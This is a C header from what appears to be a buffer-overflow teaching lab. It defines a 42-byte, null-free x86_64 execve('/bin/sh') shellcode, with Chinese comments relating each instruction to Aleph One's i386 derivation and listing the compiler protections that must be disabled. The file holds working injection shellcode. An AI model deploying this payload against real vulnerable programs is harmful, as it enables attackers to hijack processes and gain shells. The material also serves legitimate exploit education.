/*
 * shellcode.h - execve("/bin/sh") x86_64 shellcode(42 字节, 无 \x00)
 *
 * 描述(对照 Aleph One 论文的推导过程; 论文是 i386,这里是 x86_64):
 *
 *   1. 目标语义(论文 shellcode.c):
 *        execve("/bin/sh", argv, NULL), execve 失败则 exit(0)
 *
 *   2. 系统调用约定(论文 int 0x80 -> 现在是 syscall 指令):
 *        x86_64 用寄存器传参: rax=59(execve)/60(exit), rdi/rsi/rdx=参数1/2/3
 *
 *   3. 位置无关引用字符串(论文 "JMP/CALL 技巧" 的 64 位等价物):
 *        论文: jmp 过字符串, call 回来,pop 取 call 压入的字符串地址
 *        这里: jmp 过字符串, lea rdi,[rip-14] 用负向 RIP 相对位移直取
 *        为什么必须负向位移:
 *          a) 无 \x00: 正向位移 (0x1a,0x00,0x00,0x00) 含 3 个 NUL;
 *             负向位移的补码 (0xf2,0xff,0xff,0xff) 天然全非零.
 *          b) 字符串结束符: 数据里的 "/bin/sh" 只有 7 字节, NUL 由代码在
 *             运行时写入 (mov byte [rdi+7], sil) -- 对应论文的
 *             movb $0x0,0x7(%esi). 若 NUL 预先写进数据,strcpy 会在
 *             shellcode 中途截断, 返回地址根本进不了 payload.
 *
 *   4. 硬性前提:
 *        -z execstack            栈可执行(否则 NX 拦截)
 *        -fno-stack-protector    无 canary(否则 __stack_chk_fail)
 *        -no-pie                 非 PIE(栈上地址可预测)
 *
 *   字节布局(offset: bytes | insn):
 *      0: eb 07                jmp +7           -> 跳过字符串到 offset 9
 *      2: "/bin/sh"            7 字节数据(无 NUL,运行时补写)
 *      9: 48 8d 3d f2 ff ff ff lea rdi,[rip-14] -> rdi=2 (&"/bin/sh")
 *     16: 31 f6                xor esi,esi
 *     18: 40 88 77 07          mov [rdi+7],sil  -> 写入 NUL 结束符
 *     22: 56                   push rsi         -> argv[1] = NULL
 *     23: 57                   push rdi         -> argv[0] = &"/bin/sh"
 *     24: 48 89 e6             mov rsi,rsp      -> argv = &argv[0]
 *     27: 48 31 d2             xor edx,edx      -> envp = NULL
 *     30: 6a 3b                push 59
 *     32: 58                   pop rax          -> rax = 59 (SYS_execve)
 *     33: 0f 05                syscall          -> execve("/bin/sh", argv, NULL)
 *     35: 31 ff                xor edi,edi      -> 退出码 0
 *     37: 6a 3c                push 60
 *     39: 58                   pop rax          -> rax = 60 (SYS_exit)
 *     40: 0f 05                syscall          -> exit(0)(仅 execve 失败时到达)
 */
#ifndef BOF_LAB_SHELLCODE_H
#define BOF_LAB_SHELLCODE_H

static const char shellcode[] =
    "\xeb\x07"                          /*  0: jmp +7(跳过字符串)  */
    "/bin/sh"                           /*  2: 数据:路径名          */
    "\x48\x8d\x3d\xf2\xff\xff\xff"      /*  9: lea rdi,[rip-14]      */
    "\x31\xf6"                          /* 16: xor esi,esi           */
    "\x40\x88\x77\x07"                  /* 18: mov [rdi+7],sil 补NUL */
    "\x56"                              /* 22: push rsi  argv[1]=NULL */
    "\x57"                              /* 23: push rdi  argv[0]=path */
    "\x48\x89\xe6"                      /* 24: mov rsi,rsp           */
    "\x48\x31\xd2"                      /* 27: xor edx,edx envp=NULL */
    "\x6a\x3b"                          /* 30: push 59               */
    "\x58"                              /* 32: pop rax               */
    "\x0f\x05"                          /* 33: syscall -> execve      */
    "\x31\xff"                          /* 35: xor edi,edi           */
    "\x6a\x3c"                          /* 37: push 60               */
    "\x58"                              /* 39: pop rax               */
    "\x0f\x05";                         /* 40: syscall -> exit(0)     */

#define SHELLCODE_DESC "x86_64 execve(\"/bin/sh\"), 42 bytes, null-free"

#endif /* BOF_LAB_SHELLCODE_H */
